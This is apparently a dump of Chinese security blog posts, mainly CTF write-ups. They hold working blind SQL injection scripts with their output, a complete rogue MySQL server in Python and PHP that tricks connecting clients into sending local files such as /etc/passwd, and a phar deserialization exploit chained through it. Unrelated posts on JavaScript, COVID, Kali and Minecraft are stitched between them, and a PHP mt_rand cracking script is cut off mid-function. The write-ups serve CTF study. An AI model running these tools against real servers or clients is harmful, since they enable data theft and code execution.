%df%5c 是一个宽字符，也就是縗’，也就是说：%df\\’ = %df%5c%27=縗’。 盲注： ?id=1%df' and 1=2 %23 页面正常返回，确认该点存在注入 1?id=1%df%27;set @base=CONCAT(&quot;SELE&quot;,&quot;CT &quot;,&quot;databa&quot;,&quot;ses();&quot;);prepare pr1 from @base;execute pr1; payload1 预编译支持把语句进行十六进制的编码，和ascii编码注入，这样就能绕过关键词 1234567891011121314151617181920import requestsflag=&#x27;&#x27;def str_to_hex(s): return &#x27;&#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;,&#x27;&#x27;) for c in s])for i in range(1,50): print(i) a=0 for j in range(32, 128): sql = &quot;select if((ascii(substr((select group_concat(fllllll4g) from table1),&quot;+str(i)+&quot;,1))=&#x27;&quot;+str(j)+&quot;&#x27;),sleep(3),2);&quot; # balabala,eihe,fllllll4g sql_hex = str_to_hex(sql) url = &quot;http://177bc1216dbb425eadc08e04596972703c678bc9a4ed4cfc.changame.ichunqiu.com/?id=1%df%27;SET @a=0x&quot; + str(sql_hex) + &quot;;PREPARE st FROM @a;EXECUTE st;&quot; try: result = requests.get(url, timeout=3) except requests.exceptions.ReadTimeout: flag += chr(j) print(flag) a=1 break if a==0: break payload2 过滤了select，但是可以用concat+char构造select 用set+prepare+execute 来读取数据 不能直接concat将字符分割，因为PDO是过滤双引号的，例如: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import requestsurl = &#x27;http://a98055a96df440a5b22efb8a9a282bab4d5239406f904837.changame.ichunqiu.com/&#x27;#url = &#x27;http://192.168.92.129/CTF/ichunqiu2020/easysqli_copy/&#x27;def databaseLength(): for i in range(1,30): t1=&#x27;select if(length(database())=&#123;&#125;,sleep(3),1)&#x27;.format(i) # database() length t2 = &#x27;&#x27; for k in t1: t2 += &#x27;char(&#123;&#125;),&#x27;.format(ord(k)) t3 = &quot;set @t1=concat(&#123;&#125;);PREPARE t2 FROM @t1;EXECUTE t2;&quot;.format(t2[:-1]) payload = &#x27;?id=1%df%27;&#123;&#125;&#x27;.format(t3) #print(payload) try: re1 = requests.get(url+payload,timeout=3) except Exception as e: print(&quot;[*] database length: &#123;&#125;&quot;.format(i)) break print(&quot;[*] Database length explore completed!&quot;)def getTableName(databaseName=&quot;database()&quot;): res = &#x27;&#x27; hasnext=True # Used to determine if the scan is complete for pos in range(1,43): if hasnext: hasnext=False for exp in range(45,126): t1 = &#x27;select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#123;database&#125;),&#123;position&#125;,1))=&#123;exploer&#125;,sleep(3),1)&#x27;.format(database=databaseName,position=pos,exploer=exp) t2 = &#x27;&#x27; for k in t1: t2 += &#x27;char(&#123;&#125;),&#x27;.format(ord(k)) t3 = &quot;set @t1=concat(&#123;&#125;);PREPARE t2 FROM @t1;EXECUTE t2;&quot;.format(t2[:-1]) payload = &#x27;?id=1%df%27;&#123;&#125;&#x27;.format(t3)# print(payload) try: re1 = requests.get(url+payload,timeout=3) except Exception as e: hasnext=True res += chr(exp) print(res) break print(&#x27;res:&#x27;+res) print(&quot;[*] Table_Name explore completed!&quot;) return resdef getFlag(TableName,ColumuName): res = &#x27;&#x27; hasnext=True for i in range(1,43): if hasnext: for s in range(45,126): t1 = &#x27;select if(ascii(substr((select &#123;column&#125; from &#123;table&#125;),&#123;position&#125;,1))=&#123;exploer&#125;,sleep(3),1)&#x27;.format(column=ColumuName,table=TableName,position=i,exploer=s) t2 = &#x27;&#x27; for k in t1: t2 += &#x27;char(&#123;&#125;),&#x27;.format(ord(k)) t3 = &quot;set @t1=concat(&#123;&#125;);PREPARE t2 FROM @t1;EXECUTE t2;&quot;.format(t2[:-1]) payload = &#x27;?id=1%df%27;&#123;&#125;&#x27;.format(t3) #print(payload) try: re1 = requests.get(url+payload,timeout=3) except Exception as e: hasnext=True res += chr(s) print(res) break print(&#x27;res:&#x27;+res) print(&quot;[*] Flag explore completed!&quot;)databaseLength()getTableName()getFlag(&quot;table1&quot;,&quot;fllllll4g&quot;) 12345678910111213141516171819202122id=1%df%27;set @t1=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(105),char(102),char(40),char(97),char(115),char(99),char(105),char(105),char(40),char(115),char(117),char(98),char(115),char(116),char(114),char(40),char(40),char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(108),char(108),char(108),char(108),char(108),char(52),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(116),char(97),char(98),char(108),char(101),char(49),char(41),char(44),char(52),char(50),char(44),char(49),char(41),char(41),char(61),char(52),char(53),char(44),char(115),char(108),char(101),char(101),char(112),char(40),char(49),char(48),char(41),char(44),char(49),char(41));PREPARE t2 FROM @t1;EXECUTE t2;[*] database length: 7[*] Database length explore completed!ttatabtabltabletable1res:table1[*] Table_Name explore completed!fflflaflagflag&#123;flag&#123;0flag&#123;0c...flag&#123;0c2c2daa-0408-44ba-bac2-003211b82cc8&#125;res:flag&#123;0c2c2daa-0408-44ba-bac2-003211b82cc8&#125;[*] Flag explore completed! 简单的招聘系统 先注册一个账号admin:admin，然后在登陆的地方测试有没有sql注入 admin' and 1=1#提示登录成功 admin' and 1=0#提示登录失败 很明显可以进行盲注 继续测试过滤词发现没有什么被过滤的，所以直接盲注干就完了! payload1 123456789101112131415161718192021222324252627# encoding=utf-8import requestsurl = &#x27;http://d3be80acd6b647538ef872aaf3a60eba55137cfb4e1b455c.changame.ichunqiu.com/index.php&#x27; #payload = &quot;2&#x27; and (select (mid((select database()),1,&#123;0&#125;)))!=&#x27;&#123;1&#125;&quot;#payload = &quot;2&#x27; and (select (mid((select table_name from information_schema.tables where table_schema=&#x27;nzhaopin&#x27; limit 1 offset 3),1,&#123;0&#125;)))!=&#x27;&#123;1&#125;&quot;#payload = &quot;2&#x27; and (select (mid((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; limit 1 offset 1),1,&#123;0&#125;)))!=&#x27;&#123;1&#125;&quot;payload = &quot;2&#x27; and (select (mid((select flaaag from flag limit 1 offset 0),1,&#123;0&#125;)))!=&#x27;&#123;1&#125;&quot;# backup flag user flag: id flaaagflag = &#x27;&#x27;letter = &#x27;abcdefghijklmnopqrstuvwxyz0123456789_-&#123;&#125;&#x27;for i in range(1,80): for n in letter: data=&#123; &quot;lname&quot;: payload.format(i, flag+n), &quot;lpass&quot;: &#x27;xxx&#x27; &#125; req = requests.post(url,data=data) req.encoding = &#x27;gbk&#x27; #print(req.encoding) print(data[&quot;lname&quot;]) #print(req.text.encode(&#x27;gbk&#x27;).decode(req.apparent_encoding)) if &quot;成功&quot; not in req.text.encode(&#x27;gbk&#x27;).decode(req.apparent_encoding): print(&quot;* &quot;+n) flag+=n print(flag) break payload2 二分法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsimport stringurl=&#x27;http://53204ecfab104ab59f348e6630a591febde427b11c25454a.changame.ichunqiu.com/index.php&#x27;letter = &#x27;&#123;&#125;&#123;&#125;0123456789_-&#123;&#125;,()&#x27;.format(string.ascii_uppercase,string.ascii_lowercase,&quot;&#123;&#125;&quot;)def BiggerThanMid(payload,num): # if bigger than num,it return True payload.format(num) data=&#123; &quot;lname&quot;: payload, &quot;lpass&quot;: &#x27;admin&#x27; &#125; content=requests.post(url,data=data) if &quot;成功&quot; in content.text.encode(&quot;utf-8&quot;).decode(content.apparent_encoding): return True else: return Falsedef BinaryInjection(payload): # maxLength: Assume the maximum length of the database min = 1 # 最小的下标 max = 255 # 最大的下标 while (max-min)&gt;1: i += 1 mid = (max + min) // 2 # 中间的下标每次向下取整(rounding down) if BiggerThanMid(payload,mid) : min = mid # 大于需要的猜的数，则将最小下标变为中间的 else : max = mid # 小于需要的猜的数，则将最大下标变为中间的 return maxdef databaseLength(): payload=&quot;admin&#x27; and if(length(database())&gt;&#123;&#125;,1,0)#&quot; # length of database return BinaryInjection(payload) return databaseNamedef getxxxName(payload,length=20): xxxName=&quot;&quot; for i in range(length): payload=payload.format(i) xxxName+=chr(BinaryInjection(payload)) return xxxNameif __name__ == &quot;__main__&quot;: Length=databaseLength() getDatabaseName=&quot;admin&#x27; and if(ascii(mid((database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot; DatabaseName=getxxxName(getDatabaseName,Length) getTableName=&quot;admin&#x27; and if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot; TableName=getxxxName(getTableName,20) #getColumnName=&quot;admin&#x27; and if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=--------),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot; #ColumnName=getxxxName(getColumnName,20) easysqli bypass information_schema id=1时返回nu1l，id=1 or 1=1#提示sql injection， 2020新春战疫公益CTF 新春战疫CTF"},{"title":"恶意mysql服务器","date":"2020-02-19","updated":"2024-03-19","path":"2020/02/19/恶意mysql服务器/","text":"DDCTF中出现过，其他比赛已经记不清了，主要是分析利用mysql中Load data infile这个命令交互过程的一部分 Load data infile LOAD DATA INFILE语句以非常高的效率从文本文件中读取行并插入到表中。导入的文件名必须以字符串格式给定,一般我们常用的语句是这样的： 1load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &#x27;\\n&#x27;; mysql server会读取服务端的/etc/passwd然后将数据按照’\\n’分割插入表中，但现在这个语句同样要求你有FILE权限，以及非local加载的语句也受到secure_file_priv的限制 123mysql&gt; load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &#x27;\\n&#x27;;ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement 如果我们修改一下语句，加入一个关键字local。 123mysql&gt; load data local infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &#x27;\\n&#x27;;Query OK, 11 rows affected, 11 warnings (0.01 sec)Records: 11 Deleted: 0 Skipped: 0 Warnings: 11 加了local之后，这个语句就成了，读取客户端的文件发送到服务端，上面那个语句执行结果如下 很显然，这个语句是不安全的，在mysql的文档里也充分说明了这一点 https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html 在mysql文档中的说到，服务端可以要求客户端读取有可读权限的任何文件。 mysql认为客户端不应该连接到不可信的服务端。 MySql Load Data Infile 过程分析 打开mysql服务器， wireshark抓包分析 先创建一个文件 root/tete,内容为asdasd 执行LDI语句 12345678910111213MariaDB [test]&gt; select * from LDI;+---------+| content |+---------+| asdasd || asdasd || asdasd |+---------+3 rows in set (0.007 sec)MariaDB [test]&gt; load data local infile &quot;/root/tete&quot; into table LDI FIELDS TERMINATED BY &#x27;\\n&#x27;;Query OK, 1 row affected (0.002 sec) Records: 1 Deleted: 0 Skipped: 0 Warnings: 0 这个语句主要流程如下 客户端请求将本地/root/tete插入到表LDI中 服务端返回客户端需要的文件路径root/tete 客户端返回文件内容给服务器 原本的查询流程为 123客户端：我要把win.ini插入test表中服务端：我要你的win.ini内容客户端：win.ini的内容如下.... 假设服务端由我们控制，把一个正常的流程篡改成如下 123客户端：我要test表中的数据服务端：我要你的win.ini内容客户端：win.ini的内容如下??? 在greeting包之后，客户端就会链接并试图登录，同时数据包中就有关于是否允许使用load data local的配置，可以从这里直白的看出来客户端是否存在这个问题（这里返回的客户端配置不一定是准确的，后面会提到这个问题）。在mysql登录验证的过程中，会发送客户端的配置。 恶意服务器构造 回复mysql client一个greeting包 等待client端发送一个查询包 回复一个file transfer包 python版代码rogue_mysql_server.py : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249#!/usr/bin/env python#coding: utf8import socketimport asyncoreimport asynchatimport structimport randomimport loggingimport logging.handlersPORT = 3306log = logging.getLogger(__name__)log.setLevel(logging.INFO)tmp_format = logging.handlers.WatchedFileHandler(&#x27;mysql.log&#x27;, &#x27;ab&#x27;)tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))log.addHandler( tmp_format)filelist = ( #&#x27;/etc/passwd&#x27;, &#x27;D:/test&#x27;,)#================================================#=======No need to change after this lines=======#================================================__author__ = &#x27;Gifts&#x27;def daemonize(): import os, warnings if os.name != &#x27;posix&#x27;: warnings.warn(&#x27;Cant create daemon on non-posix system&#x27;) return if os.fork(): os._exit(0) os.setsid() if os.fork(): os._exit(0) os.umask(0o022) null=os.open(&#x27;/dev/null&#x27;, os.O_RDWR) for i in xrange(3): try: os.dup2(null, i) except OSError as e: if e.errno != 9: raise os.close(null)class LastPacket(Exception): passclass OutOfOrder(Exception): passclass mysql_packet(object): packet_header = struct.Struct(&#x27;&lt;Hbb&#x27;) packet_header_long = struct.Struct(&#x27;&lt;Hbbb&#x27;) def __init__(self, packet_type, payload): if isinstance(packet_type, mysql_packet): self.packet_num = packet_type.packet_num + 1 else: self.packet_num = packet_type self.payload = payload def __str__(self): payload_len = len(self.payload) if payload_len &lt; 65536: header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num) else: header = mysql_packet.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num) result = &quot;&#123;0&#125;&#123;1&#125;&quot;.format( header, self.payload ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = ord(raw_data[0]) payload = raw_data[1:] return mysql_packet(packet_num, payload)class http_request_handler(asynchat.async_chat): def __init__(self, addr): asynchat.async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.state = &#x27;LEN&#x27; self.sub_state = &#x27;Auth&#x27; self.logined = False self.push( mysql_packet( 0, &quot;&quot;.join(( &#x27;\\x0a&#x27;, # Protocol &#x27;5.6.28-0ubuntu0.14.04.1&#x27; + &#x27;\\0&#x27;, &#x27;\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&#x27;, )) ) ) self.order = 1 self.states = [&#x27;LOGIN&#x27;, &#x27;CAPS&#x27;, &#x27;ANY&#x27;] def push(self, data): log.debug(&#x27;Pushed: %r&#x27;, data) data = str(data) asynchat.async_chat.push(self, data) def collect_incoming_data(self, data): log.debug(&#x27;Data recved: %r&#x27;, data) self.ibuffer.append(data) def found_terminator(self): data = &quot;&quot;.join(self.ibuffer) self.ibuffer = [] if self.state == &#x27;LEN&#x27;: len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1 if len_bytes &lt; 65536: self.set_terminator(len_bytes) self.state = &#x27;Data&#x27; else: self.state = &#x27;MoreLength&#x27; elif self.state == &#x27;MoreLength&#x27;: if data[0] != &#x27;\\0&#x27;: self.push(None) self.close_when_done() else: self.state = &#x27;Data&#x27; elif self.state == &#x27;Data&#x27;: packet = mysql_packet.parse(data) try: if self.order != packet.packet_num: raise OutOfOrder() else: # Fix ? self.order = packet.packet_num + 2 if packet.packet_num == 0: if packet.payload[0] == &#x27;\\x03&#x27;: log.info(&#x27;Query&#x27;) filename = random.choice(filelist) PACKET = mysql_packet( packet, &#x27;\\xFB&#123;0&#125;&#x27;.format(filename) ) self.set_terminator(3) self.state = &#x27;LEN&#x27; self.sub_state = &#x27;File&#x27; self.push(PACKET) elif packet.payload[0] == &#x27;\\x1b&#x27;: log.info(&#x27;SelectDB&#x27;) self.push(mysql_packet( packet, &#x27;\\xfe\\x00\\x00\\x02\\x00&#x27; )) raise LastPacket() elif packet.payload[0] in &#x27;\\x02&#x27;: self.push(mysql_packet( packet, &#x27;\\0\\0\\0\\x02\\0\\0\\0&#x27; )) raise LastPacket() elif packet.payload == &#x27;\\x00\\x01&#x27;: self.push(None) self.close_when_done() else: raise ValueError() else: if self.sub_state == &#x27;File&#x27;: log.info(&#x27;-- result&#x27;) log.info(&#x27;Result: %r&#x27;, data) if len(data) == 1: self.push( mysql_packet(packet, &#x27;\\0\\0\\0\\x02\\0\\0\\0&#x27;) ) raise LastPacket() else: self.set_terminator(3) self.state = &#x27;LEN&#x27; self.order = packet.packet_num + 1 elif self.sub_state == &#x27;Auth&#x27;: self.push(mysql_packet( packet, &#x27;\\0\\0\\0\\x02\\0\\0\\0&#x27; )) raise LastPacket() else: log.info(&#x27;-- else&#x27;) raise ValueError(&#x27;Unknown packet&#x27;) except LastPacket: log.info(&#x27;Last packet&#x27;) self.state = &#x27;LEN&#x27; self.sub_state = None self.order = 0 self.set_terminator(3) except OutOfOrder: log.warning(&#x27;Out of order&#x27;) self.push(None) self.close_when_done() else: log.error(&#x27;Unknown state&#x27;) self.push(&#x27;None&#x27;) self.close_when_done()class mysql_listener(asyncore.dispatcher): def __init__(self, sock=None): asyncore.dispatcher.__init__(self, sock) if not sock: self.create_socket(socket.AF_INET, socket.SOCK_STREAM) self.set_reuse_addr() try: self.bind((&#x27;&#x27;, PORT)) except socket.error: exit() self.listen(5) def handle_accept(self): pair = self.accept() if pair is not None: log.info(&#x27;Conn from: %r&#x27;, pair[1]) tmp = http_request_handler(pair)z = mysql_listener()# daemonize()asyncore.loop() php版 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpfunction unhex($str) &#123; return pack(&quot;H*&quot;, preg_replace(&#x27;#[^a-f0-9]+#si&#x27;, &#x27;&#x27;, $str)); &#125;$filename = &quot;/etc/passwd&quot;;$srv = stream_socket_server(&quot;tcp://0.0.0.0:3306&quot;);while (true) &#123; echo &quot;Enter filename to get [$filename] &gt; &quot;; $newFilename = rtrim(fgets(STDIN), &quot;\\r\\n&quot;); if (!empty($newFilename)) &#123; $filename = $newFilename; &#125; echo &quot;[.] Waiting for connection on 0.0.0.0:3306\\n&quot;; $s = stream_socket_accept($srv, -1, $peer); echo &quot;[+] Connection from $peer - greet... &quot;; fwrite($s, unhex(&#x27;45 00 00 00 0a 35 2e 31 2e 36 33 2d 30 75 62 75 6e 74 75 30 2e 31 30 2e 30 34 2e 31 00 26 00 00 00 7a 42 7a 60 51 56 3b 64 00 ff f7 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 64 4c 2f 44 47 77 43 2a 43 56 63 72 00 &#x27;)); fread($s, 8192); echo &quot;auth ok... &quot;; fwrite($s, unhex(&#x27;07 00 00 02 00 00 00 02 00 00 00&#x27;)); fread($s, 8192); echo &quot;some shit ok... &quot;; fwrite($s, unhex(&#x27;07 00 00 01 00 00 00 00 00 00 00&#x27;)); fread($s, 8192); echo &quot;want file... &quot;; fwrite($s, chr(strlen($filename) + 1) . &quot;\\x00\\x00\\x01\\xFB&quot; . $filename); stream_socket_shutdown($s, STREAM_SHUT_WR); echo &quot;\\n&quot;; echo &quot;[+] $filename from $peer:\\n&quot;; $len = fread($s, 4); if(!empty($len)) &#123; list (, $len) = unpack(&quot;V&quot;, $len); $len &amp;= 0xffffff; while ($len &gt; 0) &#123; $chunk = fread($s, $len); $len -= strlen($chunk); echo $chunk; &#125; &#125; echo &quot;\\n\\n&quot;; fclose($s);&#125; 使用操作流程 python2 rogue_mysql_server.py 在同目录下tail -f mysql.log 客户机连接mysql -u root -p,执行一个查询,例如select 1 客户端连接成功后会自动执行select @@version_comment limit 1来获取详细版本信息(Source Distribution) 看到mysql.log输出读到的文件内容 123456tail -f mysql.log2020-02-19 21:11:56,136:INFO:Conn from: (&#x27;192.168.92.1&#x27;, 65354)2020-02-19 21:11:56,137:INFO:Last packet2020-02-19 21:11:56,138:INFO:Query2020-02-19 21:15:52,836:INFO:Result: &#x27;\\x02flag&#123;asdzxcqwsd&#125;&#x27;2020-02-19 21:15:52,836:INFO:-- result php版本操作相同 读取本地文件触发反序列化 load data local file 反序列化 2018年BlackHat大会上的Sam Thomas分享的File Operation Induced Unserialization via the “phar://” Stream Wrapper议题，原文https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf 。 在该议题中提到，在PHP中存在一个叫做Stream API，通过注册拓展可以注册相应的伪协议，而phar这个拓展就注册了phar://这个stream wrapper。 知道创宇404实验室安全研究员seaii曾经的研究(https://paper.seebug.org/680/)中表示，所有的文件函数都支持stream wrapper。 深入到函数中，我们可以发现，可以支持steam wrapper的原因是调用了 1stream = php_stream_open_wrapper_ex(filename, &quot;rb&quot; ....); 从这里，我们再回到mysql的load file local语句中，在mysqli中，mysql的读文件是通过php的函数实现的 1234567891011https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L43-L52if (PG(open_basedir)) &#123; if (php_check_open_basedir_ex(filename, 0) == -1) &#123; strcpy(info-&gt;error_msg, &quot;open_basedir restriction in effect. Unable to open file&quot;); info-&gt;error_no = CR_UNKNOWN_ERROR; DBG_RETURN(1); &#125; &#125;info-&gt;filename = filename;info-&gt;fd = php_stream_open_wrapper_ex((char *)filename, &quot;r&quot;, 0, NULL, context); 也同样调用了php_stream_open_wrapper_ex函数，也就是说，我们同样可以通过读取phar文件来触发反序列化。 复现 首先需要一个生成一个phar 123456789101112131415161718192021pphar.php&lt;?phpclass A &#123; public $s = &#x27;&#x27;; public function __wakeup () &#123; echo &quot;pwned!!&quot;; &#125;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a &quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new A();$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 使用该文件生成一个phar.phar 然后我们模拟一次查询 1234567891011121314151617test.php&lt;?phpclass A &#123; public $s = &#x27;&#x27;; public function __wakeup () &#123; echo &quot;pwned!!&quot;; &#125;&#125;$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, &#x27;&#123;evil_mysql_ip&#125;&#x27;, &#x27;root&#x27;, &#x27;123456&#x27;, &#x27;test&#x27;, 3667);$p = mysqli_query($m, &#x27;select 1;&#x27;);// file_get_contents(&#x27;phar://./phar.phar&#x27;); 图中我们只做了select 1查询，但我们伪造的evil mysql server中驱使mysql client去做load file local查询，读取了本地的 1phar://./phar.phar 成功触发反序列化 相关资料 Load Data Infile Mysql Connection Phase Packets COM_QUERY Response Rogue-MySql-Server"},{"title":"js_Script_src","date":"2020-02-15","updated":"2024-03-19","path":"2020/02/15/js-Script-src/","text":"定义和用法 src 属性规定外部脚本文件的 URL。 如果您希望在网站中的多个页面上运行相同的 JavaScript，就应该创建外部 JavaScript 文件，而不是重复编写相同的脚本。把脚本文件以 .js 扩展名进行保存，然后在 标签中使用 src 属性引用它。 注意：外部脚本文件不能包含 标签。 注意：正确地引用您写入脚本的外部脚本文件。 语法 1&lt;script src=&quot;URL&quot;&gt; 注意 一旦&lt;script&gt;标签使用了src属性，它就作为一个引用外部文件而非编辑页面内部的脚本的元素。也就是说，使用src表明该元素适用于引用一个外部 Javascript 文件，且不是为了在页面中插入一段 Javascript 脚本。 这表明，不应当也无必要（而且无用）在使用了src属性的标签中再插入代码。这会引起不可预知的结果，并且，至少在大多数浏览器中，这没有实际效果。假如向本文实例添加下列代码： 123&lt;script src=&quot;demo_script_src.js&quot;&gt; document.write(&quot;这个输出的内容来自本文件的 Javascript。&quot;);&lt;/script&gt; 它可能会正常解析src属性所引用的 Javascript 文件，但可能并不会执行直接在&lt;script&gt;标签内编辑的任何代码。显然，&lt;script&gt;的诸多特殊性质（比如它的部分只能用于外部文件的属性）决定了，不可能再正常执行引用的外部文件的同时又兼顾其中直接编辑的内容。 这一点是一个必须说明的。"},{"title":"武汉加油_中国加油","date":"2020-02-13","updated":"2024-03-19","path":"2020/02/13/武汉加油-中国加油/","text":"致敬奋战在疫区一线的医务人员，人民警察，防疫人员，人民子弟兵，夜以继日工作的火神山医院工程建设者，放弃休假连续加班的口罩厂员工！感谢所有“坚守”，致敬所有“逆行”！ 我们在过年，这群人在帮我们过关。隔离病毒，绝不是隔离爱。14亿人万众一心、众志成城，就没有我们过不去的坎！武汉加油！中国加油！ 你们一定要平安归来！！"},{"title":"Ctrl_Alt_A","date":"2020-02-13","updated":"2024-03-19","path":"2020/02/13/Ctrl-Alt-A/","text":"Ctrl+Alt+A这个快捷键是QQ的截图热键，kali上是一个很奇幻的功能…按下之后所有的中断会变得透明，非终端不受影响，不清楚这个还有什么别的奇幻功能，到现在为止它的功能就是占据了我的截图软件快捷键… 2020 3 13更新: 这个原来是终端终结者这个的窗口可见与不可见的快捷键（由于kalidist-upgrade的升级导致了环境崩溃只能重新配置，不然也不会去研究这玩意儿…)"},{"title":"我的世界导入资源","date":"2020-02-13","updated":"2024-03-19","path":"2020/02/13/我的世界导入资源/","text":"我的世界国际基岩版(C++版，pe[pocket]，be[bedrock]，win10) 地图导入 存储位置: C:\\Users\\hasee\\AppData\\Local\\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\minecraftWorlds 导入方法: 将地图文件直接复制到这路径即可 地图文件示例 行为包(behavior)和资源包(resource)的导入 存储位置: C:\\Users\\hasee\\AppData\\Local\\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang 这是存放行为包和资源包的地方 导入方法 限于1.10以后的版本 行为包将后缀改为.mcaddon打开游戏后双击行为包就自动导入了 资源包将后缀改为.mcpack打开游戏后双击资源包就自动导入了 包示例"},{"title":"HGAME2020-week3","date":"2020-02-09","updated":"2024-03-19","path":"2020/02/09/HGAME2020-week3/","text":"序列之争 官方wp: 12345678910111213public function __construct()&#123; if(!isset($_SESSION[&#x27;rank&#x27;]))&#123; $this-&gt;Set(rand(2, 1000)); return; &#125; $this-&gt;Set($_SESSION[&#x27;rank&#x27;]); &#125;public function Set($no)&#123; $this-&gt;rank = $no; &#125;public function Get()&#123; return $this-&gt;rank; &#125; 最终exp: 1234567891011121314151617&lt;?phpclass Rank &#123; private $rank = 1; private $serverKey; private $key; public function __construct()&#123; $this-&gt;key = &amp;$this-&gt;serverKey; &#125;&#125;$data = [&#x27;e99&#x27;, &#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;]; $sign = &#x27;&#x27;; foreach($data as $value)&#123; $sign .= md5($sign . $value);&#125; $rank = serialize(new Rank()); echo(base64_encode($rank . md5($rank . $sign))); 或者 1234567891011&lt;?php class Rank &#123; private $rank = 1;&#125;$data = [&#x27;e99&#x27;, &#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;];$sign = &#x27;&#x27;;foreach($data as $value)&#123; $sign .= md5($sign . $value);&#125;$rank = serialize(new Rank());echo(base64_encode($rank . md5($rank . $sign))); php格式化字符串漏洞: 对于这道题目先测试普通名称 第一次循环后 $this-&gt;welcomeMsg被替换成ABC 第二次循环中$value的值就是秘钥，但是$welcomeMsg里面并没有%s之类的格式化符号,所以$welcomeMsg的值不变。 想要输出秘钥就要在第二次循环里出现%s， 所以 将名字输入成%s，经过第一次循环后$welcomeMsg变成了%s,Welcome to Ordina....,这样第二次循环中就有%s，然后$welcomeMsg就被替换成了秘钥。 二发入魂 Breaking PHP’s mt_rand() with 2 values and no bruteforce 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182# Breaking mt_rand() with two output values and no bruteforce.# &quot;&quot;&quot; R = final rand valueS = merged state values = original state value&quot;&quot;&quot;import randomimport sysN = 624M = 397MAX = 0xffffffffMOD = MAX + 1# STATE_MULT * STATE_MULT_INV = 1 (mod MOD)STATE_MULT = 1812433253STATE_MULT_INV = 2520285293MT_RAND_MT19937 = 1MT_RAND_PHP = 0def php_mt_initialize(seed): &quot;&quot;&quot;Creates the initial state array from a seed. &quot;&quot;&quot; state = [None] * N state[0] = seed &amp; 0xffffffff; for i in range(1, N): r = state[i-1] state[i] = ( STATE_MULT * ( r ^ (r &gt;&gt; 30) ) + i ) &amp; MAX return statedef _undo_php_mt_initialize(s, i): s = (STATE_MULT_INV * (s - i)) &amp; MAX return s ^ s &gt;&gt; 30def undo_php_mt_initialize(s, p): &quot;&quot;&quot;From an initial state value `s` at position `p`, find out seed. &quot;&quot;&quot; for i in range(p, 0, -1): s = _undo_php_mt_initialize(s, i) return sdef php_mt_rand(s1): &quot;&quot;&quot;Converts a merged state value `s1` into a random value, then sent to the user. &quot;&quot;&quot; s1 ^= (s1 &gt;&gt; 11) s1 ^= (s1 &lt;&lt; 7) &amp; 0x9d2c5680 s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 ^= (s1 &gt;&gt; 18) return sdef undo_php_mt_rand(s1): &quot;&quot;&quot;Retrieves the merged state value from the value sent to the user. 